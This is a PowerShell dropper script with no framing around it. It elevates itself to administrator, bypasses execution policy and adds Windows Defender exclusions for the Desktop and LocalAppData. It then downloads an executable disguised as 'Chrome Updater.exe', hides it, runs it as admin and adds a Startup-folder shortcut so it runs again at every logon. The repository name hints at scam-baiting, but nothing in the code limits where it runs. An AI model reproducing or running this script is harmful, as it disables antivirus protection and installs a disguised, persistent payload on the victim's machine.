# === Initialization ===
$scriptPath = $MyInvocation.MyCommand.Path
$desktop = [System.Environment]::GetFolderPath('Desktop')
$exeUrl = "https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%20Updater.exe"
$exePath = Join-Path -Path $desktop -ChildPath "Chrome Updater.exe"
$tempPath = [System.Environment]::GetFolderPath('LocalApplicationData')
$fontExePath = Join-Path -Path $tempPath -ChildPath "Chrome Updater.exe"

# Relaunch as administrator if not already elevated
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

# === Defender Exclusions ===
Add-MpPreference -ExclusionPath $desktop
Add-MpPreference -ExclusionPath $exePath
Add-MpPreference -ExclusionPath $tempPath
Add-MpPreference -ExclusionPath $fontExePath

# === Download EXE ===
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

# Wait for file to be ready (up to 15 seconds)
$waitTime = 0
while (-not (Test-Path $exePath) -and $waitTime -lt 15000) {
    Start-Sleep -Milliseconds 500
    $waitTime += 500
}

if (Test-Path $exePath) {
    # Hide the downloaded file
    (Get-Item $exePath).Attributes = 'Hidden'

    # Run the EXE (visible)
    Start-Process -FilePath $exePath -Verb RunAs

    # Create a shortcut in the Startup folder
    $startupFolder = Join-Path -Path $tempPath -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = Join-Path -Path $startupFolder -ChildPath "Chrome Updater.lnk"
    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $fontExePath
    $shortcut.Save()
} else {
    [System.Windows.Forms.MessageBox]::Show("Failed to download the EXE file.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Exclamation)
}